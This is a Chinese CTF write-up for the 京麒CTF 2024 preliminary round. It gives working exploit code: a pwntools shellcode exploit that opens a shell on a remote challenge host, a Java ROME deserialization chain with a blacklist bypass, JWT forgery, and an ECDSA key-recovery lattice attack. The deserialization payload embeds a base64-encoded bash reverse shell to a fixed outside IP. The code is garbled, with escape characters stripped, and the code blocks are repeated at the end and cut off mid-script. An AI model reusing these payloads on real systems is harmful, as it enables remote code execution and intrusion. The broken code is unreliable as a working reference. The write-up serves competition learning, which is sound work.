# 京麒CTF 2024 初赛 Writeup

> 原文: https://www.ctfiot.com/184181.html
> ID: 184181

今次好彩數啊，啱好過線。

1. Pwn

unsetunset1.1 MazeCodeV1unsetunset

走迷宫，然后把迷宫路线当shellcode执行，要求低位(&3)是能走出迷宫的序列

case 0: y -= 1;

case 1: x += 1;

case 2: y += 1;

case 3: x -= -1;

maze = [list(i) for i in maze_raw.split('n')]
visit = [[False for _ in range(len(maze[0]))] for _ in range(len(maze))]

def dfs(x, y, path, depth):
    if maze[x][y] == 'T':
        print(''.join(path), depth)
        return
    visit[x][y] = True
    for dx, dy, c in [(0, 1, "1"), (0, -1, "3"), (1, 0, "2"), (-1, 0, "0")]:
        nx, ny = x + dx, y + dy
        if 0 <= nx < len(maze) and 0 <= ny < len(maze[0]) and not visit[nx][ny] and maze[nx][ny] != '#':
            dfs(nx, ny, path + [c], depth + 1)

dfs(1, 1, [], 0)

序列：111122110011221122110011112211222211222222110011112211221100110000001100001100001122222222332222332211223333223322221122333322111122110011112222332211222233003322221111

帕鲁搓一下脚本

from pwn import *

def rep(s):
    return s.replace("2", "xchg esi,eaxn").replace("3", "xchg ebx,eaxn").replace("1", "xchg   ebp,eaxn").replace("0", "nopn")

def rep2(s):
    return s.replace("2", "push rdxn").replace("3", "push rbxn").replace("1", "push rcxn").replace("0", "nopn")

context.arch = "amd64"

sc1 = '''xchg   ecx,eax
xchg   ecx,eax
xchg   ecx,eax
xchg   ecx,eax
xchg   edx,eax
mov esp, 0x404e02 
xchg   edx,eax'''
sc2 = b'x40xFExCCx92x40xFExCC'
sc3 = '''xchg   edx,eax
push rsp
pop rdx
push rsp
pop rsi
push rdx
pop rcx
syscalln''' + 
     rep('1001122112211001111221122221122222211001111221122110011000000110000110000112222222') + 
     'nmov bx,0x6873n' + 
     rep('22222332211223333223322221122333322111122110011112222330') + 
     '''n
xchg   edx,eax
xchg   edx,eax
xchg   edx,eax
xchg   ecx,eax
pop    rdi
pop rcx
pop rcx
push rdx
push rdx
push rdx
push   0x3bn''' + rep('3003322') + 'npop    raxn' + rep2('222111') + 'nsyscallnxchg   ecx,eax'

# p = process("./pwn")
p = remote("116.198.74.135", 39659)
sc = asm(sc1) + sc2 + asm(sc3)
for i in sc:
    print(str(i&3), end="")
print()
# gdb.attach(p, "b *0x401744")
# sleep(1)
p.sendline(sc)
sleep(1)
p.sendline(cyclic(999).replace(b'aaaabaaa', p64(0x404dd0)).replace(b'eaaafaaa', b'/bin/shx00'))
p.interactive()

2. Reverse

unsetunset2.1 easy-wasmunsetunset

window翻了一下，发现window['😘😘❤️😘😘']，调用一下，发现是加密函数，而且每一位都加密为16长的字符，位之间互不相关，与长度无关，直接加密flag{然后在wasm翻找对应的密文。

翻找出来之后爆破一把

// 加密函数，你需要替换成实际的加密函数
function enc(input) {
    return atob(window["😘😘❤️😘😘"](input))
}

function splitStringIntoChunks(str, chunkSize) {
    var chunks = [];
    for (var i = 0; i < str.length; i += chunkSize) {
        chunks.push(str.substring(i, i + chunkSize));
    }
    return chunks;
}

let target = splitStringIntoChunks("5aa21921dda7d9519a012f285b9b9e498f495fb521d4712b0075e47962bc2eed7fd840cba2f2ab48875fe73a122d7bc71a6ed990a07631962e4acde26acc2b1123cb4d4fea2a62119df940611399c05fc6ddc371e1e81b648423ef2b4ad5a3845b7f376e0067cd27116fbb7dfce00c9aad258356b00a7a1e4ca60ce5d4753899bc31a9151d7d79e5efcadfe3d5b6b11a962917538987cccd6516be6c4f9a24e0c28ab4b58bc4ccbfbaf8e3f5eb799dcca5bfdbc7943aeb4d69ad49f173f187d26aae14da51901871d15ea0cb78ecbb66",16)

// 逐位爆破函数
function bruteForce(target) {
    let known = ""; // 已知部分
    let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"; // 字符集

    for (let i = 0; i < target.length; i++) {
        let encryptedTarget = target[i];
        let knownLength = known.length;

        for (let j = 0; j < charset.length; j++) {
            let char = charset[j];
            let candidate = known + char;

            if (enc(candidate).endsWith(encryptedTarget)) {
                known += char; // 如果加密后的结果匹配，则认为当前字符是正确的
                break;
            }
        }
    }

    return known; // 返回爆破得到的字符串
}
bruteForce(target);

运行拿下

unsetunset2.2 Hot Soupunsetunset

HSP3逆向，可以看这个学：https://qiita.com/mikecat_mixc/items/e5766198a16460ab192f

HSPdeco对提取得到的bin反编译，可以得到一份残缺的代码，不过大差不差，最主要的还是少了一些import函数调用。

从bin里可以找到被import进来的函数，根据参数个数和前后逻辑等信息可以直接super guesser补全反编译代码。

最后直接逆就完事：

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main() {
    char enc[] = {170, 171, 238, 146, 108, 213, 219, 252, 124, 214, 109, 121, 137, 14, 215, 200, 6, 43, 199, 235, 37, 127, 36, 26, 26, 8, 64, 90, 135, 71, 236, 42, 30, 3, 226, 241, 42, 141, 217, 58, 190, 54, 192, 21, 61, 74, 144, 7, 0};
    char xor_data[] = {29, 133, 154, 72, 126, 45, 210, 251, 118, 158, 238, 142, 141, 188, 82, 234, 239, 57, 62, 184, 224, 129, 8, 79, 73, 164, 185, 72, 209, 161, 50, 127, 87, 219, 50, 207, 154, 190, 71, 101, 76, 156, 130, 127, 165};

    char var_20[32] = {0};
    srand(2333333);
    for (int i = 0; i < 32; i++) {
        var_20[i] = rand() % 256;
    }

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    DWORD dwDataLen;

    // 获取 CSP 句柄
    if (!CryptAcquireContext(&hProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, -268435456)) {
        printf("Error %x during CryptAcquireContext!n", GetLastError());
        exit(1);
    }

    // 创建 SHA-256 哈希对象
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Error %x during CryptCreateHash!n", GetLastError());
        CryptReleaseContext(hProv, 0);
        exit(1);
    }

    // 计算 var_20 的哈希值
    if (!CryptHashData(hHash, (BYTE*)var_20, 32, 0)) {
        printf("Error %x during CryptHashData!n", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        exit(1);
    }

    // 从哈希值生成 AES-128 密钥
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        printf("Error %x during CryptDeriveKey!n", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        exit(1);
    }

    dwDataLen = 48;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, enc, &dwDataLen)) {
        printf("Error %x during CryptDecrypt!n", GetLastError());
    }

    for (int i = 0; i < 45; i++) {
        enc[i] ^= xor_data[i];
    }

    printf("flag{%45s}n", enc);

}

unsetunset2.3 possible-doorunsetunset

tauri打包的程序，随便去网上搜一下可以找到解包相关的东西( https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/)。搜一下可以发现主要就2个文件需要提取：index.html和index-C9fLaX_M.js。

index.html其实也没啥，就画下前端，重点是js。js主要包括了大量跟密码学和网络通信相关的东西，从流量包里面的信息也可以看出来这是个后门程序。直接搜pub、sig等字符串可以定位到js的关键位置。

可以看出来js会从rust端调用get_rand_num命令获取随机数作为ecdsa的密钥，然后获取公钥并对data进行签名。

回到rust，谢天谢地有pdb，有符号看真是太爽啦！直接看main函数就可以找到rust端对命令的解析。在list_dir和read_file返回data的时候会把数据进行aes-128-cbc加密，key和iv似乎来自lazy_static调用的call_once闭包，获取32字节随机数来生成（*ZN3std4sync4once4Once9call_once28*$u7b$$u7b$closure$u7d$$u7d$17hd086cc8aab34d205E_llvm_1403079709150435794）。那么问题就变成了如何获取key和iv？

仔细观察可以发现，get_rand_num命令和enc函数获取随机数用的是同一个call_once闭包！根据call_once的性质，在程序运行时只会调用一次！也就是说，aes所使用的key和iv与js获取的私钥是同一个随机数！

这样问题就变成通过公钥来得到私钥了。从js可以看到，公钥的格式是DER，解析出来可以得到使用的curve是secp256k1。另外js显示，签名使用的是sha256哈希，采用的随机数范围是时间戳，截至目前只有41比特位，相比签名而言很小。而流量包有十几二十组签名data对，完全可以将私钥泄露出来。

由伟大的密码✌写的脚本：

import binascii, base64
from Crypto.Util.number import long_to_bytes, bytes_to_long
from hashlib import sha256

# secp256k1
P = 2**256 - 2**32 - 977
N = 115792089237316195423570985008687907852837564279074904382605163141518161494337
A = 0
B = 7
E = EllipticCurve(GF(P), [A,B])

data = [
    (b"MEQCIDTcwKOn9Hn/Ty2CbznFVapsPtQUsjEyuIWcEsgisnCoAiBQOuY8J1lED9IKau/bjbHb1a76BtVS+fiouYp9dcxrKA==",
     b"e8NUGgEIa+k8sSm4ofSbIgMWmEw33rbS1L8lqAKR6iaNYcIuHfiHLMp0wfplCzeKwpZW/QxUj0VEoSWEUvdhkHkJjRieURbg43yWMn3z0A5RluSSEuAsG++RzK7Yoy1nBTsBDpgIlh4OoWxfp9iso8+S7m8x1nBT9cl1ex6rSfEfYTLKtRPmoinnjV59/6g7+VMfiseH54G2G5G4rx5jq5TZk4GzS9xP2XhXzqSgWwKl/ZDPXsYnLOkaHFdMNeeXq1KuxCLwvjf01VdwmzSUFqQk0U0APhWyJA08m1LKRz58AKF18kDs+K3I/maCaFzB21ZpJHLnq2/BbvRfte551N36K6Yf12ffBJ+BTl7oH0fgJjZZaXWPAp+I5/xGKwBA"),
    (b"MEQCIFLxDvFCOOQSNZ2SoBDoUTTz1lFACZ8ngSRP4rVKX0CWAiA/vfXD2AElXmb6Zst7UtmFcrpqiHD1NWVhq8mS1Q7MUQ==",
     b"sO2sRQDGCYV9NykEdkR65Sflmcig5zRHj/h64ciExkLdG/oNlaZ8tI1B0bsav+qubaS+3fQAe60exHQUv7YCQfdYT/3qBNuycaBi3ZIO1eiWXWl6RMRFKb5i6VasVwZCybIm7ojY7HPSqd6676OJJ8pvQJreAi8T4caTyizgI/NanxekmnnUdM7svitep5SQ8tWvxZUQg8gsJqtUAedgMGMD5QyTVchRKoNAiKlhwxgXYkeg5kOOokq4xP+End8bmlDUFSt9+p+6OEJDeHzVNIybPbJ4eB6Qu7yIor6oYBPjn6dJW6mab5PiXnZnZ4ilXeumlAkbcKMl2rorDtXAggk2jhYQrSu3TpnqfDpNgB4R9+TlCuELKCElrqwM6grmZ99OGc/IzunNJU7izTK5bazEbMGSzXoS0GTm/MtwoxQIy9IhD6eovMRWduUjuSy+UiZMjzbtJY9+nOjUfb0G0W+q1u551NBqVqiXnxGnZtDXE8Fl0LFS9uAtZFWa+s0H"),
    (b"MEUCIE4oqeQY5tSbYvL1phltM4hIJLK2fLejy7D3BVgGtrrwAiEAjpN3jiGjAg19/BPH6xNgquI1doPuTPqNAh0TzJnEKO8=",
     b"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"),
    (b"MEQCIDjQ/jMMOHKW+1ajmVyGiped93CeBPIinzJgOt3FEhKYAiBYzbxCX+/79IgG5OQzq12KoVgDwaMEFsnkaChSfDZS5w==",
     b"4wlpou+C7tIo1rmSj+aHNaV6FFeqTUxAOvxoZiG/GwymRZSG2Vc5xudwNRnGowFt1IRpaoZrjm0Slxbv0MKWZGNIUS7B5jCCJn9BTc90x50="),
    (b"MEQCIHYf9M1WhFbcF63h2sTHu824O9DyOBUIbzudFTD2YOxqAiAb9oqq2/h/sgJ+Pk7jn4yhpohfixZLbeRtxcjnDwI0NQ==",
     b"bNtkPT71kQVt1xDpqp9GJR22wBt8IwCk39LcYrgBNDJoMn2EWGJEdNzvUz0tX7O4R9R7xnC/dJMFhguFPnqNNGUTidK3k9PjXjW2Q8z83uyguospnQ8V4eFZZG995qFrjFk941atB7sSvw/tIo1hopZeSzTeIsdQ0mWEAefvc1jHTehQW/dGwVEYYvlJqrU5S0TCZoevmUjcgNFlNusnUHBj4CmqCRJwV336tYNqpu1WInySFT3AUo2gA2D+1+ECgxsBgsgqGW9uevDHiflMbvtj+Z1QW55h3FqhM1Ccs99EMX0EE9HWgN98lx5zpvYvpKgMlVvov/tMb2Rwel933bRm2BglYxlxrTGk40KoXLA7bIuapkojqrsavLTxzshGgR4GyQ/k62d2UhI3Rf7cvdGYxffADb/a2nroZTCDGF++LTLI7/dWZCQ1hgbZuLJC8g1kvVlIYslHKKnr+T/uSiQrq9CQGcFJzySteVo6BHE6TXAb6PPORo7JU/z2TzdRZpDBl4Ph8s+4Ftv0iKmN0FWKQT20Tzek1YJAt9Rv9EIRClon4o2YLyKj9NMQzi1g8Z59cLxBmHU6VEP/HcOIkj2vvsTnOso+uMdmqxBeQP1edOcXeZos2MA6T0POF6rF8ttpPK/oR3ZRhtKLtQ11L/yumNLgmDrQSoNHrucGuySeMpnAjTDkUTpXGvwt+OlClgwFqAN5RbPB2O6QRc42P3fUw0fS0W7PvJwHqlDW4wbLQ0X84MRbMP6ie13Jde7XjnTmHVmuGx70XywDJhYQEw=="),
    (b"MEYCIQCpx+kVw/+1u7YY7H4k0plemLJNpOBJKDvZIuzF+edY3gIhAPJNf7T2fYPjSb5viIOktFgBsNzSMUHfE0aqNIhp2GiG",
     b"RgbUgZ5PUbA+Cv2OnvLrI8X8/sW8r61EJPI/lQYC97pZrMFAw6WhaG5LfC5TpNBFJGbI92fNCVSmf6X15GWL6g=="),
    (b"MEYCIQDaHSk0ts21UkwsKiac7DbnFFof/dXuV/ZasagF3xIzcQIhANYYbymHoAUqQkO7rChnK/G56fvFiPakl6rWJFYE+N0z",
     b"h4RmLMB1rERLmKjKB/ilmA==")
]

rs,ss = [], []
hs = []
for sig,msg in data:
    print(base64.b64decode(sig))
    sig = base64.b64decode(sig)[2:]
    if sig[:2] == b'x02 ':
        rs.append(bytes_to_long(sig[2:2+32]))
        sig = sig[2+32:]
    else:
        rs.append(bytes_to_long(sig[2:2 + 33]))
        sig = sig[2 + 33:]
    assert 32<=len(sig[2:])<=33
    ss.append(bytes_to_long(sig[2:]))

    # hs.append(bytes_to_long(sha256(base64.b64decode(msg)).digest()))
    hs.append(bytes_to_long(sha256(msg).digest()))

    print()

n = 7

r0 = rs[0]
s0 = ss[0]
h0 = hs[0]
q = N

BB = 1716708884867 * 2
M = Matrix(QQ, n+2,n+2)
for i in range(n):
    M[i,i] = q
    M[-2, i] = rs[i] * inverse_mod(ss[i],q) % q
    M[-1, i] = hs[i] * inverse_mod(ss[i],q) % q
M[-2,-2] = BB / q
M[-1,-1] = BB

L = M.LLL()
print(L[0])
print(L[1])

ks = L[1][:-2]
k0 = ks[0]
x = (k0*s0-h0) * inverse_mod(r0,q)%q

for i in range(n):
    assert ks[i]*ss[i]% q == (hs[i] + rs[i]*x)%q

print(x)

# 39313219724394204510065149548180909443668279642741674773372964155008434357587

拿到私钥后前半部分是key，后半部分是iv，解密ecdas.py，里面就有flag了。

（PS：禁止往re里塞phd level math！）

3. Web

unsetunset3.1 ezjvavunsetunset

admin/admin 登录后会看到一段js，复制进控制台运行后得到一个路由/source，访问完返回you are not root need jsrc!!!，猜测是要jwt伪造成root用户。

jsrc base64 后作为 key。

authToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyIiwic3ViIjoiMiIsImlhdCI6MTcxNjY5NTM5OSwicm9sZXMiOiJyb290IiwiZXhwIjoxNzE2Njk4OTk5fQ.w8JBgfsiVEBluG9pyNjc1_uTcnJNUVxylUoeFbuob1g

然后有一个jar包

@RestController
public class Jsrc {
  @PostMapping({"/Jsrc"})
  public String jsrc(@RequestParam(name = "data", required = false) String data, Model model) throws Exception {
    try {
      byte[] decode = Base64.getDecoder().decode(data.replaceAll(" +", "+"));
      InputStream inputStream = new ByteArrayInputStream(decode);
      MyObjectInputStream myObjectInputStream = new MyObjectInputStream(inputStream);
      ByteCompare byteCompare = new ByteCompare();
      byteCompare.Compared(decode);
      myObjectInputStream.readObject();
    } catch (Exception var6) {
      var6.printStackTrace();
      model.addAttribute("msg", "data=");
      return var6.toString().replaceAll("java.*: ", "");
    } 
    return "oh, yeah!";
  }
}

public class ByteCompare {
  private static final ArrayList blacklist = (ArrayList)new ArrayList<>();
  
  String[] s = new String[] { "java.util.HashMap", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.alibaba.fastjson.JSONArrayLlist" };
  
  public ByteCompare() {
    blacklist.add(this.s[0].getBytes());
    blacklist.add(this.s[1].getBytes());
    blacklist.add(this.s[2].getBytes());
  }
  
  public void Compared(byte[] OriginData) {
    for (int k = 0; k < 3; k++) {
      for (int i = 0; i < OriginData.length - ((byte[])blacklist.get(k)).length + 1; i++) {
        boolean found = true;
        for (int j = 0; j < ((byte[])blacklist.get(k)).length; j++) {
          if (OriginData[i + j] != ((byte[])blacklist.get(k))[j]) {
            found = false;
            break;
          } 
        } 
        if (found)
          throw new NullPointerException("Don't hacker!"); 
      } 
    } 
  }
}

使用 utf-8 Overlong Encoding绕过ByteCompare，参考《探索Java反序列化绕WAF新姿势》( https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd )，然后打rome即可

import com.sun.syndication.feed.impl.EqualsBean;
import util.CustomObjectOutputStream;
import util.createTemplatesImpl;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Rome2 {
    public static void main(String[] args) throws Exception {
        //依然使用TemplatesImpl来执行命令
        Templates templates = createTemplatesImpl.makeTemplatesImpl("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNS4yMzguNTIvMzA2NjAgMD4mMQ==}|{base64,-d}|{bash,-i}");

        EqualsBean bean = new EqualsBean(String.class,"");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa",templates);
        map1.put("bB",bean);
        map2.put("aa",bean);
        map2.put("bB",templates);
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");

        Field beanClass = bean.getClass().getDeclaredField("_beanClass");
        beanClass.setAccessible(true);
        beanClass.set(bean, Templates.class);

        Field obj = bean.getClass().getDeclaredField("_obj");
        obj.setAccessible(true);
        obj.set(bean, templates);

        serialize(map);
        unserialize("ser.bin");
    }
    public static String serialize(Object o) throws Exception {
//        ObjectOutputStream p = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        CustomObjectOutputStream  p = new CustomObjectOutputStream(new FileOutputStream("ser.bin"));
        p.writeObject(o);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        CustomObjectOutputStream  oos = new CustomObjectOutputStream (baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println(base64String);
        System.out.println(base64String.length());
        return base64String;
    }
    public static Object unserialize(String filename) throws  Exception{
        ObjectInputStream p = new ObjectInputStream(new FileInputStream(filename));
        Object o = p.readObject();
        return o;
    }
}

简单的suid提权，获得flag

4. Misc

unsetunset4.1 flag_video_versionunsetunset

右键UDP流，decode as 选 RTP，得到H264

然后重排seq

筛选一下rtp.seq导出，然后tshark加sort一把

tshark -r vid.pcapng -T fields -e rtp.seq -e rtp.payload | sort ….

播放拿下


```
maze = [list(i) for i in maze_raw.split('n')]
visit = [[False for _ in range(len(maze[0]))] for _ in range(len(maze))]

def dfs(x, y, path, depth):
    if maze[x][y] == 'T':
        print(''.join(path), depth)
        return
    visit[x][y] = True
    for dx, dy, c in [(0, 1, "1"), (0, -1, "3"), (1, 0, "2"), (-1, 0, "0")]:
        nx, ny = x + dx, y + dy
        if 0 <= nx < len(maze) and 0 <= ny < len(maze[0]) and not visit[nx][ny] and maze[nx][ny] != '#':
            dfs(nx, ny, path + [c], depth + 1)

dfs(1, 1, [], 0)
from pwn import *

def rep(s):
    return s.replace("2", "xchg esi,eaxn").replace("3", "xchg ebx,eaxn").replace("1", "xchg   ebp,eaxn").replace("0", "nopn")

def rep2(s):
    return s.replace("2", "push rdxn").replace("3", "push rbxn").replace("1", "push rcxn").replace("0", "nopn")

context.arch = "amd64"

sc1 = '''xchg   ecx,eax
xchg   ecx,eax
xchg   ecx,eax
xchg   ecx,eax
xchg   edx,eax
mov esp, 0x404e02 
xchg   edx,eax'''
sc2 = b'x40xFExCCx92x40xFExCC'
sc3 = '''xchg   edx,eax
push rsp
pop rdx
push rsp
pop rsi
push rdx
pop rcx
syscalln''' + 
     rep('1001122112211001111221122221122222211001111221122110011000000110000110000112222222') + 
     'nmov bx,0x6873n' + 
     rep('22222332211223333223322221122333322111122110011112222330') + 
     '''n
xchg   edx,eax
xchg   edx,eax
xchg   edx,eax
xchg   ecx,eax
pop    rdi
pop rcx
pop rcx
push rdx
push rdx
push rdx
push   0x3bn''' + rep('3003322') + 'npop    raxn' + rep2('222111') + 'nsyscallnxchg   ecx,eax'

# p = process("./pwn")
p = remote("116.198.74.135", 39659)
sc = asm(sc1) + sc2 + asm(sc3)
for i in sc:
    print(str(i&3), end="")
print()
# gdb.attach(p, "b *0x401744")
# sleep(1)
p.sendline(sc)
sleep(1)
p.sendline(cyclic(999).replace(b'aaaabaaa', p64(0x404dd0)).replace(b'eaaafaaa', b'/bin/shx00'))
p.interactive()
// 加密函数，你需要替换成实际的加密函数
function enc(input) {
    return atob(window["😘😘❤️😘😘"](input))
}

function splitStringIntoChunks(str, chunkSize) {
    var chunks = [];
    for (var i = 0; i < str.length; i += chunkSize) {
        chunks.push(str.substring(i, i + chunkSize));
    }
    return chunks;
}

let target = splitStringIntoChunks("5aa21921dda7d9519a012f285b9b9e498f495fb521d4712b0075e47962bc2eed7fd840cba2f2ab48875fe73a122d7bc71a6ed990a07631962e4acde26acc2b1123cb4d4fea2a62119df940611399c05fc6ddc371e1e81b648423ef2b4ad5a3845b7f376e0067cd27116fbb7dfce00c9aad258356b00a7a1e4ca60ce5d4753899bc31a9151d7d79e5efcadfe3d5b6b11a962917538987cccd6516be6c4f9a24e0c28ab4b58bc4ccbfbaf8e3f5eb799dcca5bfdbc7943aeb4d69ad49f173f187d26aae14da51901871d15ea0cb78ecbb66",16)

// 逐位爆破函数
function bruteForce(target) {
    let known = ""; // 已知部分
    let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"; // 字符集

    for (let i = 0; i < target.length; i++) {
        let encryptedTarget = target[i];
        let knownLength = known.length;

        for (let j = 0; j < charset.length; j++) {
            let char = charset[j];
            let candidate = known + char;

            if (enc(candidate).endsWith(encryptedTarget)) {
                known += char; // 如果加密后的结果匹配，则认为当前字符是正确的
                break;
            }
        }
    }

    return known; // 返回爆破得到的字符串
}
bruteForce(target);
    #include <stdio.h>
    #include <stdlib.h>
    #include <Windows.h>

int main() {
    char enc[] = {170, 171, 238, 146, 108, 213, 219, 252, 124, 214, 109, 121, 137, 14, 215, 200, 6, 43, 199, 235, 37, 127, 36, 26, 26, 8, 64, 90, 135, 71, 236, 42, 30, 3, 226, 241, 42, 141, 217, 58, 190, 54, 192, 21, 61, 74, 144, 7, 0};
    char xor_data[] = {29, 133, 154, 72, 126, 45, 210, 251, 118, 158, 238, 142, 141, 188, 82, 234, 239, 57, 62, 184, 224, 129, 8, 79, 73, 164, 185, 72, 209, 161, 50, 127, 87, 219, 50, 207, 154, 190, 71, 101, 76, 156, 130, 127, 165};

    char var_20[32] = {0};
    srand(2333333);
    for (int i = 0; i < 32; i++) {
        var_20[i] = rand() % 256;
    }

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    DWORD dwDataLen;

    // 获取 CSP 句柄
    if (!CryptAcquireContext(&hProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, -268435456)) {
        printf("Error %x during CryptAcquireContext!n", GetLastError());
        exit(1);
    }

    // 创建 SHA-256 哈希对象
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Error %x during CryptCreateHash!n", GetLastError());
        CryptReleaseContext(hProv, 0);
        exit(1);
    }

    // 计算 var_20 的哈希值
    if (!CryptHashData(hHash, (BYTE*)var_20, 32, 0)) {
        printf("Error %x during CryptHashData!n", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        exit(1);
    }

    // 从哈希值生成 AES-128 密钥
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        printf("Error %x during CryptDeriveKey!n", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        exit(1);
    }

    dwDataLen = 48;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, enc, &dwDataLen)) {
        printf("Error %x during CryptDecrypt!n", GetLastError());
    }

    for (int i = 0; i < 45; i++) {
        enc[i] ^= xor_data[i];
    }

    printf("flag{%45s}n", enc);

}
import binascii, base64
from Crypto.Util.number import long_to_bytes, bytes_to_long
from hashlib import sha256

# secp256k1
P = 2**256 - 2**32 - 977
N = 115792089237316195423570985008687907852837564279074904382605163141518161494337
A = 0
B = 7
E = EllipticCurve(GF(P), [A,B])

data = [
    (b"MEQCIDTcwKOn9Hn/Ty2CbznFVapsPtQUsjEyuIWcEsgisnCoAiBQOuY8J1lED9IKau/bjbHb1a76BtVS+fiouYp9dcxrKA==",
